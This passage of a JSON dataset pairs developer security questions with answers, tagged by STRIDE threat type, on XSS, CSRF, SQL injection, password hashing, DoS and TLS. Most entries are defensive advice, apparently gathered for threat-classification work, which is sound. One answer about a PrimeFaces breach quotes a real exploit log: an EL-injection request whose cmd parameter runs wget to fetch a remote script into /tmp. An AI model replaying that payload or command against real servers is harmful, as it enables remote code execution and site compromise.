    "Attack": " However, we currently have no security measurements against things such as XSS and other kinds of possible attacks that are out there.XSS is probably the biggest concern as it is the most common possible way of attacking.   Now, i wonder ... what steps would be smart to take? I have taken a look around and i have seen that stuff like XSS-Filter exist.Implementing such would be pretty easy, just copy past the source and add it as a  in tomcats web.xml.  How would you say is it recommended to deal with security issues, for example XSS? Do you use a certain predefined framework that suits the needs or is your security \"hand-made\" by following things like the [LINK]?  You could validate all request headers, post params and query params in one Interceptor for simplistic XSS validation. Escape all user-supplied data on output ",
    "Mitigation": ""
  },
  {
    "Threat": "T",
    "Attack": " I would like to secure an ASP.NET web application against hacking. Is there a list of ASP.NET specific tasks specifically coding wise to make an ASP.NET more secure? Beyond what is mentioned on [LINK]. I am interested in specific steps with code examples on ways to avoid cross site request forgeries &amp; cross site scripting.   I know about using SQL parameters for sql injection, Windows authentication when connecting to SQL Server and validating form's input on the server. ",
    "Mitigation": " From Microsoft-[LINK]  A more detailed checklist-[LINK] "
  },
  {
    "Threat": "D",
    "Attack": " Now I have came to the DoS attack subject and I'm trying to figure it out what I can/should do as a Java developer. Or may be it would be the system administrator job.  DoS attacks are usually the concern of IT.  If you are developing a web application, usually it's behind a front controller (apache, nginx, etc) that forwards requests to your application container (Tomcat, Rails, etc... ).  The front controllers usually/always have logic to deal with this issue ",
    "Mitigation": " DoS attacks are usually the concern of IT.  If you are developing a web application, usually it's behind a front controller (apache, nginx, etc) that forwards requests to your application container (Tomcat, Rails, etc... ).  The front controllers usually/always have logic to deal with this issue  If you are an application developer, then concentrate on XSS attacks ([LINK]) as that is totally within the application developer's responsabilities "
  },
  {
    "Threat": "S",
    "Attack": " If I hash the user's password (via client-side/javascript hashlibraries) before I send it to the server, do I increase security from people easedropping?If I put a form token (one random based, another time based), does that cover CSRF attacks?Would I have all my bases covered after all this? Would this form be secure? ",
    "Mitigation": " USE SSL,  and not just for login. [LINK] states that the session id must never be leaked over an insecure channel.   After all who cares about the password if you just spill the real authentication credentials a few milliseconds later.  "
  },
  {
    "Threat": "T",
    "Attack": " So as I understand it, they claim that for some value of [CODE], that javascript can be executed. I tried to reproduce this setting [CODE] to [CODE] and a few other simple attacks and was unable to find any signs of XSS vulnerability. ",
    "Mitigation": " There are plenty of ways of doing it, this is one way with onerror with an image tag.   [CODE] "
  },
  {
    "Threat": "I",
    "Attack": "",
    "Mitigation": " If anyone is wrestling with this issue themselves I've created a [LINK] Rule that deals with it. You can specify a list of artifact URNs that include the expected SHA1 hash value and have the enforcer verify that this is indeed what is being used in the build.  It is available through Maven Central under MIT license, with source code in GitHub here: [LINK]  While the project indicates that it is for the Bitcoinj library, it is actually a general purpose solution which could be included in any security conscious build process. It will also scan your existing project and identify any problem area while it automatically builds the whitelist for you.  Below is an example of the configuration you'd require in your project to use it.  [CODE] "
  },
  {
    "Threat": "D",
    "Attack": " For example it might be possible to flood the program with new Symbols causing a denial of service (see [LINK]). ",
    "Mitigation": " I'd recommend limiting the values that this code will accept for params[:type], before executing it. Eg with an if block like   [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " We are developing a web application where user has to input a One Time Password (which we email to the users) to complete an operation. However, if a malicious user develops a bot and guesses the pattern in which we generate the One Time Password, he can input some random email id and by not even looking at the email he can confirm the transaction. That way he can attack the system with false confirmations. Can someone please let us know how people deal with this? ",
    "Mitigation": " If your random one-time passwords have the same entropy as regular passwords, this should be just as fine as any other password solution. "
  },
  {
    "Threat": "T",
    "Attack": " I would like to assume that if I never access the [CODE] property within my application, an insecure version of my sensitive information will never be generated and have to be garbage collected.  That fine.  However, since the point of the secured form of the string is to keep the value secure from a snooping process (I assume) that can read the .Net memory, could the same snooping malicious codes simply look for a [CODE] that is hanging around in memory and find some way to access the [CODE] field, making the use of the [CODE] value essentially useless? ",
    "Mitigation": " Always dispose result of [CODE] if you ever need to access it:  [CODE]  Access [CODE] property as rare as possible, preferrably only once when you really need it. You don't want copies of password to stay in memory more and longer than needed.Always call [CODE] when you are done. This will set password to empty string and clear interal [CODE] memory. "
  },
  {
    "Threat": "T",
    "Attack": " Let's say I want my clients to give the ability to create plug-ins for their application, but I don't want to make them hacks which poke with the memory of my program, is it possible to prevent this?  ",
    "Mitigation": " You can let the plugins run in a separate process. Any information that is needed by the plugin is passed as a message to that process. Any result that is needed by the application is received as a message. You can have a separate process per plugin, or you can have all plugins run in the same process. "
  },
  {
    "Threat": "T",
    "Attack": " I scanned my website whit Acunetix Web Vulnerability Scanner and I got Host Header attack vulnerability. ",
    "Mitigation": " Use [CODE] and enforce it at the httpd (Apache, nginx, etc.) configuration level  What this means is that you should have an explicitly configured virtual host for each domain you serve. Or in other words - don't allow \"catch-all\" configurations.Check if it matches a whitelist of domains that you serve:  [CODE]  Despite what its name implies, unless you followed the first solution, [CODE] will also be populated by the [CODE] header value when PHP runs through a \"catch all\" configuration.Thus, they are both equal unless your HTTP server is properly configured, hence why both solutions above refer to [CODE] - it effectively doesn't matter if you use that or [CODE]. "
  },
  {
    "Threat": "I",
    "Attack": " So re-hashing all the passwords every 'N' days is a waste of time since the hacker can just crack it by using an old copy of the database. However, if you combine the concept of increasing the hash count over time to a password renewal policy, the concept is sound. ",
    "Mitigation": " [CODE]  Yes. Assuming that you would rehash weekly with the salt (which I believe is what you mean), there is still an issue. If someone manages to have access to a hashed password at week x, then any further hashing at week x + n does not provide any extra security.  The hacker only has to work on so much iteration at week x. Once a key is broken, he/she just has to hash it a little more like you do each week. This is dead easy and goes completely unnoticed.  If you rehash, do it with a new salt and from scratch with more iterations. Your shortcut does not bring extra safety. "
  },
  {
    "Threat": "I",
    "Attack": " If you are the victim of a man in the middle attack, the attacker can in most cases find your password when you log in, as the username and password needs to be sent to the server to obtain the session id / token anyways. ",
    "Mitigation": " Well, you stated it yourself. You have to store the username and password on the device itself. How secure are those credentials stored? Would a rogue application installed on the device be able to retrieve the credentials? If the rogue application is running under the same account as the valid application, it probably can. Even if you store those credentials encrypted, you'd have to store the secret on the device itself.   Also, mobile devices have a much higher likelihood of being lost/stolen, giving an attacker access to the device itself.  Another reason is that sending the username and password every time, increases the attack surface. It will give an attacker more messages with constant data to try to decrypt.  Finally, verifying passwords, when implemented correctly should be relatively slow, making it less desirable for API authentication.  Protocols like OAuth 2.0 work with access tokens that are valid a limited time and you'd have to have access to the refresh token to get a new access token. Refresh tokens can be easily revoked in case the device is lost or stolen. "
  },
  {
    "Threat": "I",
    "Attack": " MD5 and SHA (1..512) are frequently used, but they are designed for speed what is bad for preventing brute force attacks on encrypted passwords. ",
    "Mitigation": " [LINK] or [LINK]. Why? because they where designed to be slow instead of fast.  see also: [LINK] on [LINK] "
  },
  {
    "Threat": "I",
    "Attack": " Now with the CORS feature, it seems like this can be worked around by the malicious guys because it's the malicous server itself that is allowed to authorises the cross domain request. So if a malicious script decides to sending details to a malicious server that has [CODE] set, it can now recieve that data. ",
    "Mitigation": " I now understand that it's nothing to do with prevention of sending data, and more to do with preventing unauthorised actions. "
  },
  {
    "Threat": "E",
    "Attack": " Second question - Why is this considered a vulnerability? I've tried to reason my way through the possibilities here, but I've failed to come up with much at all. Is it a vulnerability simply because Joe the l33t h4x0r could figure out the various libraries that I'm using and then maybe use known exploits against them?  ",
    "Mitigation": " As to why it's considered a vulnerabiliy, who's saying it is? I can go pull any JavaScript Facebook uses right now. Or, more to the point, I could go to Bank of America or Chase's website and start looking through their JavaScript. If I had an account, I could even take a look at the JavaScript used once the user is logged in.  The only thing that you might need to worry about is the same thing you always need to worry about: exposing details that shouldn't be exposed. I'm not sure why you would, but it obviously wouldn't be a good idea to put your database password in a JavaScript file, for example. Other than things like that, there's nothing to worry about. "
  },
  {
    "Threat": "S",
    "Attack": " This puzzled me. If csrf token is not changing then any hacker can use that token in his request also and will be able to produce a valid request. Then how can csrf token offer security? Is it a problem with YII framework? Or did I miss some thing? I hope I did miss something. If we have to generate tokens manually please let me know how to generate and validate(preferably in YII framework) ",
    "Mitigation": " implement Csrf token generation per session.[LINK] "
  },
  {
    "Threat": "I",
    "Attack": " I'm thinking that someone injects arbitrary code into the html of my website and tries to collect information about my users. But who and in what circumstances? ",
    "Mitigation": " Those requests are coming from the ShowPass adware script - as the above commenter noted, it's most likely a matter of your visitors' machines being infected, rather than your site. There's not much you can do about it, but it isn't a direct threat to your site or server. "
  },
  {
    "Threat": "S",
    "Attack": " Assumption: If using HTTPS, one does not need to use HMAC or any form of digital signature to prevent replay attacks, man in the middle attacks and to maintain integrity. ",
    "Mitigation": " Normally what you want to do, is to have one server act as an \"authentication server\" and every server has a trust relationship to that.   Then, you use OAuth to authorize any interactions between any two other servers.  That is what the complexity is all about.  When designing a service, you need to think about ways that access might be given out.  For example, do you want time-limited access that would be good for only 7 days?  Would you want to make \"read-only\" access available?   This will give S1 options on the kinds of access to S2 that it gives to S3. "
  },
  {
    "Threat": "S",
    "Attack": " That is also relevant to another use of cookies - store session data (without using PHP native sessions, for example Codeigniter does so). So, if all browsers do not allow to safe cookie with other than current domain then It's OK.  However, it does not protect from CSRF as 'www.evilsite.com' might contain evil javascript code that will create 'evil_cookie' directly on the client when a user will perform and get a request from 'www.evilsite.com'. ",
    "Mitigation": " [\u9225\ue6c3 is it possible to set 'evil_cookie' with a path='/' and domain = 'www.goodsite.com' from another domain, from some 'www.evilsite.com'?No, user agents should ignore Set-Cookie directives with Domain attributes that do not [LINK] the current requested domain:The user agent will reject cookies unless the Domain attributespecifies a scope for the cookie that would include the originserver.  For example, the user agent will accept a cookie with aDomain attribute of &quot;example.com&quot; or of &quot;foo.example.com&quot; fromfoo.example.com, but the user agent will not accept a cookie with aDomain attribute of &quot;bar.example.com&quot; or of &quot;baz.foo.example.com&quot;.Such cookies would not even be accepted by user agents. Similar applies to the Path and Secure attributes.See also [LINK] for examples of how the Domain attribute values are interpreted by user agents. "
  },
  {
    "Threat": "D",
    "Attack": " I am creating a publicly available API using API Gateway which is backed with lambda functions to do some processing. I have secured it with a custom security header that implements hmac authentication with timestamp to protect against replay attacks. I understand that API Gateway protects against DDOS attacks through its high availability, but any invalid requests will still be passed to the lambda authentication function. So, I guess an attacker can submit invalid unauthenticated requests resulting in high costs. It will take a considerable number of requests to cause damage but it is still very doable. What is the best way to protect against that ? Thank you ",
    "Mitigation": " API Gateway offers a semi-useful mitigation to this problem in the form of the 'identity validation expression' on the Authorizer, which is just a regex that is matched against the incoming identity source header.   Besides that, you might want to just implement some kind of negative cache or validation yourself in the Authorizer function to minimize the billed milliseconds. "
  },
  {
    "Threat": "T",
    "Attack": " How did this happen? How hacker got an access to create a file? All folders perms were 755 and files - 644. ",
    "Mitigation": " This happened because your software is out of date.  It likely some plugin or even joomla its self is very old.  How to prevent this?  Well you can look up system hardening guides, and there are a lot of them out there.   Regardless, you need to start for scratch.  Completely reinstall joomla and all of its components,  scorched earth style.  Make sure everything is up to date on the new system. "
  },
  {
    "Threat": "S",
    "Attack": " How is it possible to store a user\u9225\u6a9a password completely separate from their username and other information? This way a hacker could only potentially get a password and not the corresponding username. ",
    "Mitigation": " No matter how you do it, there still needs to be a way for the authentication mechanism to tie the username/password together, so what you're seeking to do is futile.  Rather than going that route, you should be storing your passwords as Hash value that can't be decrypted, which is the [LINK].  [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " Since the server is still on the domain, domain admins will obviously be admins on the server. Are there other ways for them to obtain write access to the database that I should be worried about (such as deleting the master database mdf)? ",
    "Mitigation": " Server-level loginsDomain admins and sql server sysadmins are not equivalent.  If you're in SSMS, delve down into Security|Logins and expand.  There may be a \"BUILTIN\\Administrators\" login account.  Double-click it to check the properties of that login.  Select the \"Server Roles\".  If the \"sysadmin\" server role is checked, then all domain admins have \"sysadmin\" privileges on your sql instance.  If you uncheck it, you take that privilege away.  For a domain admin (or local machine administrator) to have sysadmin privileges, they have to be explicitly added to the sysadmin server role.  In earlier versions of SQL (2000 and maybe 2005), BUILTIN\\Administrators was part of sysadmin by default.  MS changed this in later versions because it was a security problem.  If the domain admins each have their own login (ie YourDomain\\JSmith), then you'd have to remove those individual logins from the sysadmin role.  This will show you all the logins that are part of sysadmin:  [CODE]  Database usersNext you need to identify which local database user is associated with the sql server login.  Sysadmin logins connect as the database owner (db_owner) automatically, so you may not see any database users (other than the default ones).  From SSMS, delve down into YourDbName|Security|Users and expand.  Double-click a user to open the Properties dialog. The \"General\" page will show the login for that user.  \"Membership\" will show the database-level roles the user belongs to.  If there's a user that maps back to the network admin's sql server login, great.  However, hypothetically, if you removed the BUILTIN\\Administrators sql login from the sysadmin fixed server role, that login would no longer be able to connect to the database as dbo.  You'd have to create a new database user and associate it with the login.  Something like [CODE]  Then you could start layering on permissions for the user.  You only want to allow read access, right?  Add the db user to fixed db role db_datareader:  [CODE].  If they need more permissions, add as necessary.  Something else you mentioned was the possibility of a domain admin detaching the database, attaching it to another SQL Server instance where they have sysadmin permissions, changing data within the db, then re-attaching it back to the original SQL Server instance.  I'm not sure there's much you could do to safeguard against this.  As a domain admin, he/she would have the ability to shut down the SQL Server NT service and grab the mdf/ldf files and do with them as they please.  This seems a bit of an extreme measure to take on the domain admin's part.  If this happened, it's grounds for termination, I would expect.  Would they really go this far? "
  },
  {
    "Threat": "T",
    "Attack": " From what I uderstand, CSRF token protection is completely void in this case, because attacker can retreive it with XMLHttpRequest through XSS.  ",
    "Mitigation": " Your site should have closed any XSS holes that you've found otherwise CSRF is useless. However it would be useful to add CSRF in parallel so that once all XSS bugs are fixed the site's csrf protection is working too.  Unfortunately there is no way to protect against CSRF if there are XSS holes because with an XSS hole an attacker can read your website and check for tokens (using javascript). So any way and anywhere you add a token, that token can be found and then screenscraped  However if you make sure that there are no XSS bugs on your important pages and then add CSRF protection, there are still security holes but the skill level needed to chain multiple bugs together is more difficult. "
  },
  {
    "Threat": "T",
    "Attack": " Passwords are transmitted/saved as clear textThe login dialogs are subject to XSS attacks or SQL injection ",
    "Mitigation": " -Data transmission: The user is always going to type a password and this has to be sent to your system before it was processed, so there is a high risk of being intercepted if you are using an open channel. To solve this you MUST use transport the data over an encrypted channel (SSL), no other way unless you drop the common password (for example using one-time use tokens, or delegating the authentication to a third party, like Facebook connect or openId). See [LINK]  -Input Sanitation: To avoid XSS and SQL Injection consider any input that comes from a client as a potentially risk point, therefore you have to perform validation against anything that comes form outside --> [LINK]. Another [LINK] is never use the inputs directly on queries, use as bind variables in prepared statements or stored procedures.  -Password Storage: Password should always be stored encrypted with a one way hash algorithm, so even in the case of someone accessing your DB, there is no way to recover the original passwords. Also use techniques as Salting, Hashing multiple times, etc... Also be careful to choose an algorithm that is not weak or outdated (like MD5), which can be broken by brute force easily with the increasing CPU power.  -Infrastructure: Have your machines, OS, frameworks, libraries always updated to avoid bugs and 0 day attack. Any system today is enormously complex, and the system is as secure as it weakest component.  -Other Things to Consider: Review your security policy regularly to see if needs to update anything, implement password policies (expiration, reuse, etc...), log access, use monitoring tools for your systems, etc etc etc "
  },
  {
    "Threat": "S",
    "Attack": " Recently I found a vulnerability in this architecture: if a malicious (infected) browser sends the session identifier to a bandit, the session can be easily hijacked. I can't regenerate session identifier at each request because there is no session at the server to track the expected request sequence, and that would also complicate handling of asynchronous requests. ",
    "Mitigation": " The servlet container populates the SSL session ID in a HttpServletRequest attribute, to be used by downstream components. The attribute name happens to be [CODE]. To my knowledge, this is available in all containers implementing the Servlet Specification 3.0. Prior to Servlet Spec 3.0, this was available in limited containers - Tomcat and Jetty, if I'm not mistaken.  Be forewarned though, that the SSL session ID is considered more secure than the container generated HTTP session cookie value. Leaking the SSL session ID would render even your HTTPS connections insecure. "
  },
  {
    "Threat": "S",
    "Attack": " I have noticed that my website is being attacked constantly by injecting a JavaScript file into the web page.  The malware is loading a script file from some random URL that has the following pattern: [CODE].  The malware is removed upon redeployment of the app, however after some hours the attack is reinitiated and the script is injected. ",
    "Mitigation": " There are no remote code execution vulrenabilities in JSF (Mojarra). See also its [LINK].Only in PrimeFaces 5.x there was an EL injection hole in the resource handler behind the [CODE], the [CODE]. This EL injection hole allowed the attacker to execute code on the server machine. See also its [LINK]. Your question history confirms that you're using PrimeFaces.This is already fixed in February 2016 as per [LINK] and the fix is available since PrimeFaces 5.2.21 / 5.3.8 / 6.0. In other words, just continuously keep your software up to date.That said, this could also easily have been nailed down by analyzing server access logs. Below is an example log entry whereby this vulrenability is been exploited. Note particularly the extraordinary long [CODE] request parameter and the [CODE] request parameter in a [CODE] request:GET /javax.faces.resource/dynamiccontent.properties.xhtml?pfdrt=sc&amp;ln=primefaces&amp;pfdrid=4ib88tY5cy3INAZZsdtHPFU0Qzf8xqfq7ScCVr132r36qawXCNDixKdRFB0XZvCTU9npUitDjk1QTkIeQJA4yEY72QT3qDGJpZjuqCDIWniQcr2vJZR%2B005iFZzJ%2Fi7VR9Mx5l5cedTgq9wS03rem26ubch9%2Bq4W6msPwJ1hk0KMefG9yZl3o5nYeA5gvnp9LQJb3r%2BM1yQ00zFBDzT4i9Nsx%2Fs5eaGsq9BFptosdH06iT1k7rn%2BrQtPjyIbOQzOmnMx%2F6THLsOCppRaIG7BW4VRbsIi1gJ8cRh6%2Bad71ukPWbDdM6S6O0Qcr%2FdkssHfL5%2F7y8Xy%2FcyDiiljeZj3dIibq3CSy6RBaZGzRXqjYAyV%2FJ7n3ulIkSVKszrCy3VyWb1uCY0fKLrPd3EO%2Flsw3k%2FbYSofV9MA%2BAaTnD8PXYhmiYGvp9b2R1BQGb8WgFk0fyTITJFZfUTJhM%2BiRJruw9ALDox8MY9S0SnpbmXM3LQmVYSghH0j4Zgi7Te7SZZK6gqgZEkrTA%2BQgAaZRIFG6R810xr5PZoWWG0Fdf9x491vRYtUSet8xCHIofPZ7fS5uP3mi2btGxWy8TgAEyC2wT%2F19mudycgOdTXW9nMt5nOf62fOdKSBYs2jStSwe2a6I6N5Bzp0Z7sdiJ0gmrHiYoJlkyT7p0wWGEk5Q4Xe1EPWIwGZIOr43j6BE7HUP5%2F7KdejsAQzNZZr1ox99VhH1TYwRuH7A7%2BN%2FWheWQCn%2FEM0xlpXC4GssZp4xPVah%2BP9wNH054upTkx4jH8j4houh2UfrjM9Vn18J%2BC1inTqHliDnzu9LFrm5L88eHCnLNDf6cyNmIaom7o2hEoNcffVMJ%2FhWkW7XwVkNS2b0%2B%2B1ZgQXCd7QE0dpIujuJ79keSD1cUyGdgKCVx70vtcbAcfa07Yt3DBPzeIP%2FLQjU6%2F%2BEwTS3oy4gttmMReFb7Bmn0uOUsmGZ%2FKkJNyWwN3wlsEfNFJzLx8%2FtCWjroQVWR0xS0ZudruYXAFmmi9O5iPYjyyQCH8JUrzR4N9vyWffKq1THVtN21EvX7x87Xl908kTe79uh6J61ICVo0PABqIl87m1n7te3d3pZ72PCXetr7GcaElzna95Nfoix9pwJ6GWAjRTcGNPT67lMx7cYKXmTD0mQAzXvlgWi2yEzFt9NA0NFhhZ4m6UeRZ7%2Bgs1Rr0HMpPu%2FNIvaCjTyZRdqRyxrDQ%2FF2QCTxpVEWKYWEEV2t6g%2BQ2m3Xo%2ByyWgeDbY8mHmwkdYUKO3QtwYxXtXTKT9dwCRtE1wDsYjLN0wMdSrg4YX3jCYlt7kV%2FymlnhNoSnVQoDJeumsGI1%2BdmKu2AJY8sGqXo2PJd10CxpQSO6D4F7RxA8fQji8shFybjhRek0YiEXxmvnhsBzCkBCXWguA7RXsMGLrerXVD1wHo5Jf7wQmLOyKUH7nne9ezwzVdQnaqadFehgZ6a6f5d%2FfxIRUZ1tKeLPST16CBlY0%2BPsRQDJJwWrRXdpuwon4PzHQXLD%2BAhQ%2F8j9Mb0OTM8RdZLuRjXw7tcY4muQDwMRCb92ipMiorDO8jVwPPOAXc5waNbSGmRhzOW1%2BLsQpV8OEMKVMDXq5dRoYKz6tlH0Zh4eZTHED3hK8z4cukSTXuxFpdC5NjiVsyhQU71J87Tvkzw1HxbjqhJK%2BkoPySJCmpHOmrrsbNlp0kHtNHuhY&amp;cmd=wget%20http://XXX.XXX.XXX.XXX/CONTACT/test.py%20-O%20/tmp/test.py%20--no-check-certificate HTTP/1.1&quot; 200 1 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0&quot;The [CODE] request parameter normally represents the encrypted value of an EL expression which references a bean property returning the [CODE], such as [CODE]. However, due to the weak encryption vulrenability ([LINK]), the attacker can easily supply any arbitrary encrypted string and successfully get it decrypted and finally EL-evaluated.When the PrimeFaces 5.x [LINK] decrypts the above supplied [CODE] example, then the resulting string before EL-evaluation is as below (newlines added for readability):[CODE]In effects, it creates the [LINK] and then evaluates a piece of code which basically runs the [CODE] process with the command as supplied in the [CODE] request parameter which is in this case [CODE], and pipes its output to the response. The target site in turn checks if the [CODE] response header is present and will then continue spawning other [CODE] requests which in turn uses other shell commands to traverse the folder structure, obtain information about it, find the template files and ultimately edit them to inject the cryptocurrency mining script.<h3>See also:</h3>[LINK][LINK][LINK][LINK] "
  },
  {
    "Threat": "D",
    "Attack": " What tools or techniques can I use to protect my ASP.NET web application from Denial Of Service attacks ",
    "Mitigation": " Try the Dynamic IP Restriction extension [LINK] "
  },
  {
    "Threat": "E",
    "Attack": " Edit: By foolproof I mean that it does not have any unexpected side effects.I would expect the resulting string to be totally compromised of course.I would not expect the user to be able to gain privileged information (like the content of variables not passed to printf), or the user to be able to write any memory (e.g. assign a new value to x). ",
    "Mitigation": " Take your example, as the example. Due to the variadic nature of the function, having a lot of input handlers with no handlers does not impact the code. As far as printf knows, the format string needs nothing replaced. Since you can't pass in anything destructive, even if your example took a dynamic value for ' a ...interface{}', you're protected by the compiler's string protecting code.  "
  },
  {
    "Threat": "S",
    "Attack": " Am I correct in thinking that if you pass a session cookie over an SSL encrypted request that the cookie could only be read by an attacker who had direct access to the computer that the cookie had been sent to, or the server it has been sent from, provided they are unable to crack the encryption? ",
    "Mitigation": " SSL encrypts all traffic, including the header (which contains the cookie value).  On the other hand, the cookie can be accessed via Javascript on the client machine, unless you have marked it as HttpOnly.  A hacker could potentially get this script to run via an XSS attack.  In addition, there are ways to hijack the cookie with a carefully crafted email or web page.  This is known as session riding or CSRF.  Finally, cookies are visible on the wire for any network connection beyond the point of SSL termination, e.g. if you data center uses SSL offloading and/or deep packet inspection.  Oh, and one more thing.  If SSL isn't configured correctly it is easily vulnerable to MITM attack, e.g. your server is configured to accept a null protocol.  In this case a hacker can of course read the cookie plain as day. "
  },
  {
    "Threat": "T",
    "Attack": " I have gone through a lot of articles out there to find out a simple list of characters that can restrict a user from inputting for protecting my site against XSS and SQL Injections, but couldn't find any generic list as such.  The \"black-list\" approach is fraught with problems. For both SQLi and XSS, input validation against a white-list is essential i.e. define what you do expect rather than what you don't expect. Remember also that user input - or \"untrusted data\" - comes from many places: forms, query strings, headers, ID3 and exif tags etc.  On the XSS front, always encode your output and make sure you're encoding it for the appropriate markup language it appears in. Output encoding for JavaScript is different to HTML which is different to CSS. Remember to encode not just responses which immediately reflect input, but also untrusted data stored in the database which could hold a persistent XSS threat. More on all this here:  [LINK] ",
    "Mitigation": " The \"black-list\" approach is fraught with problems. For both SQLi and XSS, input validation against a white-list is essential i.e. define what you do expect rather than what you don't expect. Remember also that user input - or \"untrusted data\" - comes from many places: forms, query strings, headers, ID3 and exif tags etc.  For SQLi, make sure you're always using parametrised SQL statements, usually in the form of stored procedure parameters or any decent ORM. Also apply the \"principal of least privilege\" and limit the damage the account connecting to your database can do. More on SQLi here: [LINK]  On the XSS front, always encode your output and make sure you're encoding it for the appropriate markup language it appears in. Output encoding for JavaScript is different to HTML which is different to CSS. Remember to encode not just responses which immediately reflect input, but also untrusted data stored in the database which could hold a persistent XSS threat. More on all this here:  [LINK] "
  },
  {
    "Threat": "S",
    "Attack": " According to Google Chrome ([LINK]) \u82a6 an attacker may be trying to intercept yours communication \u7984. What makes this browser and almost all others raising this warning in the case of a self-signed/expired certificate (and I did not write a certificate explicitly verified as invalid) and not in the case of browsing with HTTP? Again, is it less secure than browsing with HTTP? ",
    "Mitigation": " That said, even if today HTTPS certificate can be delivered freely and quickly, it would have been great, at the time of costly certificates, to have an intermediary protocol between HTTP and HTTPS. A not-less-secure-protocol-than-HTTP where there is no authentication like SSL certificates but where the data is cyphered. "
  },
  {
    "Threat": "T",
    "Attack": " I'm developing an app in React that does encryption on the client-side and sends the encrypted content back to the server for secure storage (e.g. think of online-wallets). This works well since the data is secure in case someone malicious gets access to the data. However, in case a hacker gets access to the server and changes the actual React code to send the data back in raw format as opposed to encrypted, this would defeat the whole system.So how can I force the React app to cache only once, and then any time in the future, before it pulls a new version of the app, it will warn the user that &quot;a new update is available and that they need to check twitter and/or GitHub to ensure validity&quot;?Basically I need to detect &quot;cache invalidation&quot; attempts before they happen and warn the user. How could I do this? ",
    "Mitigation": " A couple of options you might like to consider:Set [CODE] on your cache after the first time the data is loaded and then use [CODE] to detect another attempt to write to it.Create a [LINK] of the object[CODE] "
  },
  {
    "Threat": "I",
    "Attack": " Right, I am talking about license validation code in a desktop application, e.g. a method [CODE]. Of course, any protection scheme can be reverse engineered by a skilled and determined cracker. However, I'd like to prevent that anyone with some basic programming knowledge can use Reflector to build a keygen in a couple of minutes. ",
    "Mitigation": " You should sign your assemblies to avoid modifications, but... The signature can also be removed with the propper tools: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " [CODE] file has been modified[CODE] and [CODE] files were modifiedAdmin password has been changedUploading files in serverchanging file permission of files and folders ",
    "Mitigation": " Guess/steal your FTP passwordHack the server (you can't really do anything about that)Insufficient isolation on the server, meaning other customers can change your files (you can't really do anything about that either)Remote code execution bugs  Now since you say the website is from 2004, it could be that it uses [CODE] for templating or [CODE] for things like [CODE] and then include [CODE] in the code somewhere which were both done frequently back in 2004. So I'd do a quick file search for eval and the regex [CODE] as well as [CODE]. Those are prime suspects depending on how they were used. "
  },
  {
    "Threat": "D",
    "Attack": " My site is under DDos Attacks (UDP Flooding)! ",
    "Mitigation": " The web server listen on TCP protocol, a udp attack is to the server, no your site, prevent the attack is on side of the server, a.k.a, your hosting provider. "
  },
  {
    "Threat": "I",
    "Attack": " Isn't it bad if the attacker gets hash AND salt? I understand that its harder for the attacker, because the unique salts ensure that he can't check a single calculated-hash against all passwords. But still, wouldn't it be better to keep a part of the salt hidden? ",
    "Mitigation": " An attacker is &quot;allowed&quot; to know the salt - your security must be designed in a way that even with the knowledge of the salt it is still secure.What does the salt do ?Salt aids in defending against brute-force attacks using pre-computed &quot;rainbow-tables&quot;.<br/>Salt makes brute-force much more expensive (in time/memory terms) for the attacker.<br/>Calculating such a table is expensive and usually only done when it can be used for more than one attack/password.<br/>IF you use the same salt for all password an attacker could pre-compute such a table and then brute-force your passwords into cleartext... <br/>As long as you generate a new (best cryptogrpahically strong) random salt for every password you want to store the hash of there is no problem.<br/>Depending on how you use MD5 it is a weakness since MD5 is no longer seen as &quot;cryptogtaphically secure&quot;IF you want to strengthen the security further<br/>You could calculate the hash several times over (hash the hash etc.) - this doesn't cost you much but it makes a brute-force attack / calculating &quot;rainbow-tables&quot; even more expensive... please don't invent yourself - there are proven standard methods to do so, see for example [LINK] and [LINK] and [LINK]Using such a mechanism is these days mandatory since &quot;CPU/GPU time&quot; (usable for attacks like rainbow tables/brute force etc.) is getting more and more widely available (see for example the fact that Amazon's Cloud service is among the top 50 of fastest supercomuters worldwide and can be used by anyone for a comparatively small amount)!Splitting the salt into 2 pieces, one hardcoded/constant and one unique part is NOT recommended!Depending on the algorithm used this can be a weakness helping an attacker to break your security. I would highly recommend NOT doing this unless you can prove mathematically that it does not weaken your security (which is very hard to do IMHO).There is NO problem at all for an attacker to know your complete salt if you implement the security correctly...UPDATE (as per comment):[LINK]. In section 4.1 it talks about adding a part to the saltthe salt should contain data that explicitly distinguishes betweendifferent operations and different key lengthsThis has IMHO no relation to what the OP is asking. The RFC talks about information on key lengths etc. being incorporated as an additional part along with the random salt. This is very similar to having a file format containing a header section describing specific aspects of the data it contains. This does not weaken security and is possibly very usefel in a scenario where interoperability between different systems is needed.In contrast what the OP is asking is basically storing only a part of the salt in the DB while keeping the other (smaller) part hardcoded in the application which means that the salt in the DB is not complete... doing this means losing entropy of the salt (i.e. a 64-bit salt with 8 bits being constant is actually only as secure as a 56-bit salt) which in turn leads to weakening the security the salt provides (at least for any algorithm I can think off right now)... this contradicts what the OP intends (increasing security).UPDATE 2 (as per discussion with owlstead):You can add some &quot;secret&quot; (which can be hardcoded in your application) to the plaintext BEFORE hashing with PBKDF2 using a unique and random salt which is completely stored in the DB... that could help a bit although it accounts for security by obscurity IMO. "
  },
  {
    "Threat": "T",
    "Attack": " We have a Java based client/server project. Recently one of the testers has found a SQL injection vulnerability while testing the application.  We do not have enough resources to manually check the application for SQL injections.  Are there any SQL injection finders / static code analyzers that find SQL vulnerabilities in Java code? ",
    "Mitigation": " [LINK][LINK][LINK][LINK][LINK][LINK][LINK][LINK][LINK][LINK]  Read: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " I recently was reading up on SQL Injections and was wondering if the following precaution is necessary? ",
    "Mitigation": " Rather than wasting your time worrying about how you can come up with another halfway thought out \"solution\", stop and put on your Big Programmer Pants and start using prepared statements and bound variables. "
  },
  {
    "Threat": "I",
    "Attack": " I'm wondering if I should add an SSL layer between my server and client. I'm not handling any confidential data, but there is a very small chance someone might want to hack transmissions in order to gain intelligence (this is a game by the way). Now the amounts of data to be processed are considerable when compared to a small website and although the added security might be nice the most likely hackers would be users themselves, so I feel SSL would be a waste of time, but would like to hear about others experiences. ",
    "Mitigation": " This sounds like an optimization question.  If you have information that you feel is valuable, start with SSL (a relatively easy security solution to try out).  Once you have things working, benchmark the system with and without.  If you feel that the performance hit is worth spending time on to try and optimize away, do that.  If not, you're done! "
  },
  {
